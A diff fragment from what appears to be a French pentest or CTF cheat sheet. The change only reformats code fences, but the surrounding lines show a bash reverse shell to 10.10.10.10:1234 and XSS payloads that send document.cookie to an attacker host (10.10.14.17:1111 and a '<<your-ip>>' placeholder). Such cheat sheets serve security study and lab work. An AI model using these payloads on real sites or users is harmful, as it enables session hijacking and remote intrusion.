@@ -71,9 +71,8 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
     	- Cookie -->
     			- `</script><img src=1 onerror=alert(document.cookie)>` ou `<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>` ou `<a href="javascript:fetch('http://10.10.14.17:1111/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>` ou Javascript :
-       
     
-	    ```javascript=
+	```javascript=
 	    <script>
 	    fetch('http://<<your-ip>>:9001/', {
 	              method: 'POST',
@@ -81,7 +80,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 	              body:document.cookie
 	        });
 		</script>
-	    ```
+	 ```
 
     - Pour récupérer un fichier :
      ```javascript=
